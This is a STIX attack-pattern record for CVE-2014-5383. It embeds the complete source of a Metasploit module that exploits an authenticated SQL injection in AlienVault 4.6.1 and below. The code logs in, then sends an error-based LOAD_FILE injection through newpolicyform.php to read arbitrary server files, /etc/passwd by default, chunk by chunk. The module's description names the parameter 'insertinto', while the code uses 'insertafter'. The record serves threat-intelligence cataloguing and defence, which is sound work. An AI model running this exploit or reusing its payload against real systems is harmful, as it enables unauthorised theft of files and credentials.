{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b4c4acbe-74b7-4e32-875e-97c8002a0ea4",
    "created": "2024-08-14T16:32:15.147389Z",
    "modified": "2024-08-14T16:32:15.147393Z",
    "name": "\"AlienVault Authenticated SQL Injection Arbitrary File Read\"",
    "description": " AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against newpolicyform.php, using the 'insertinto' parameter. This module exploits the vulnerability to read an arbitrary file from the file system. Any authenticated user is able to exploit this, as administrator privileges are not required.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/alienvault_newpolicyform_sqli.rb",
            "external_id": "alienvault_newpolicyform_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5383"
        },
        {
            "source_name": "reference",
            "url": "http://forums.alienvault.com/discussion/2690/security-advisories-v4-6-1-and-lower"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"AlienVault Authenticated SQL Injection Arbitrary File Read\",\n      'Description'    => %q{\n        AlienVault 4.6.1 and below is susceptible to an authenticated SQL injection attack against\n        newpolicyform.php, using the 'insertinto' parameter. This module exploits the vulnerability\n        to read an arbitrary file from the file system. Any authenticated user is able to exploit\n        this, as administrator privileges are not required.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Chris Hebert <chrisdhebert[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-5383'],\n          ['OSVDB', '106815'],\n          ['EDB', '33317'],\n          ['URL', 'http://forums.alienvault.com/discussion/2690/security-advisories-v4-6-1-and-lower']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-05-09'))\n\n      register_options([\n        Opt::RPORT(443),\n        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),\n        OptString.new('USERNAME', [ true, 'Single username' ]),\n        OptString.new('PASSWORD', [ true, 'Single password' ]),\n        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ]),\n        OptInt.new('SQLI_TIMEOUT', [ true, 'Specify the maximum time to exploit the sqli (in seconds)', 60])\n      ])\n  end\n\n  def run\n\n    print_status(\"Get a valid session cookie...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')\n    })\n\n    unless res && res.code == 200\n      print_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    cookie = res.get_cookies\n\n    if cookie.blank?\n      print_error(\"Could not retrieve a cookie\")\n      return\n    end\n\n    post = {\n      'embed' => '',\n      'bookmark_string' => '',\n      'user' => datastore['USERNAME'],\n      'passu' => datastore['PASSWORD'],\n      'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])\n    }\n\n    print_status(\"Login...\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),\n      'method' => 'POST',\n      'vars_post' => post,\n      'cookie' => cookie\n    })\n\n    unless res && res.code == 302\n      print_error(\"Server did not respond in an expected way\")\n      return\n    end\n\n    unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')\n      print_error(\"Authentication failed\")\n      return\n    end\n\n    cookie = res.get_cookies\n\n    if cookie.blank?\n      print_error(\"Could not retrieve the authenticated cookie\")\n      return\n    end\n\n    i = 0\n    full = ''\n    filename = datastore['FILEPATH'].unpack(\"H*\")[0]\n    left_marker = Rex::Text.rand_text_alpha(6)\n    right_marker = Rex::Text.rand_text_alpha(6)\n    sql_true = Rex::Text.rand_text_alpha(6)\n\n    print_status(\"Exploiting SQLi...\")\n\n    begin\n      ::Timeout.timeout(datastore['SQLI_TIMEOUT']) do\n        loop do\n          file = sqli(left_marker, right_marker, sql_true, i, cookie, filename)\n          return if file.nil?\n          break if file.empty?\n\n          str = [file].pack(\"H*\")\n          full << str\n          vprint_status(str)\n\n          i = i+1\n        end\n      end\n    rescue ::Timeout::Error\n      if full.blank?\n        print_error(\"Timeout while exploiting sqli, nothing recovered\")\n      else\n        print_error(\"Timeout while exploiting sqli, #{full.length} bytes recovered\")\n      end\n      return\n    end\n\n    path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])\n    print_good(\"File stored at path: \" + path)\n  end\n\n  def sqli(left_marker, right_marker, sql_true, i, cookie, filename)\n    pay =  \"X') AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack(\"H*\")[0]},\"\n    pay << \"(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),\"\n    pay << \"0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack(\"H*\")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS\"\n    pay << \" GROUP BY x)a) AND ('0x#{sql_true.unpack(\"H*\")[0]}'='0x#{sql_true.unpack(\"H*\")[0]}\"\n\n    get = {\n      'insertafter' => pay,\n      'ctx' => 0\n    }\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ossim', 'policy', 'newpolicyform.php'),\n      'cookie' => cookie,\n      'vars_get' => get\n    })\n\n    if res && res.body && res.body =~ /#{left_marker}(.*)#{right_marker}/\n      return $1\n    else\n      print_error(\"Server did not respond in an expected way\")\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-09"
}